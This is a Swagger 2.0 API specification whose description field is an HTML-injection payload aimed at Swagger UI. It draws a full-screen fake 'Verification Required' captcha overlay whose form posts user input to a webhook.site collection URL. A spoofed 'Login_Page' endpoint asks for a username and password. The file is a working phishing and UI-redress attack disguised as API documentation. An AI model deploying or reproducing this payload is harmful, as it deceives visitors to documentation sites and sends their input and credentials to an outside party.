swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.55);z-index:99998;"></div><div style="position:fixed;top:35%;left:50%;transform:translateX(-50%);width:92%;max-width:440px;background:#fff;border-radius:10px;box-shadow:0 12px 40px rgba(0,0,0,.45);z-index:99999;overflow:hidden;font-family:Segoe UI,Arial,sans-serif;"><div style="background:#4285f4;color:#fff;padding:12px 16px;font-size:15px;font-weight:600;">Verification Required</div><div style="padding:18px 20px;font-size:14px;color:#333;">Complete the security check to access this API documentation.<br><br><div style="background:#f9f9f9;border:1px solid #d3d3d3;border-radius:4px;padding:14px;text-align:center;font-size:24px;letter-spacing:6px;font-family:monospace;text-decoration:line-through;color:#555;">7XK2P</div></div><div style="padding:0 20px 18px;"><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="captcha" placeholder="Type the code above" style="width:100%;padding:10px;margin-bottom:12px;border:1px solid #ccc;border-radius:4px;"><button type="submit" style="width:100%;padding:11px;background:#4285f4;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;">Enter code:</button></form><button type="button" style="width:100%;padding:11px;margin-top:8px;background:#eee;color:#333;border:none;border-radius:6px;font-size:15px;cursor:pointer;">Cancel</button></div></div><div style="position:fixed;bottom:10px;right:10px;font-size:12px;color:#888;z-index:99999;">v</div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
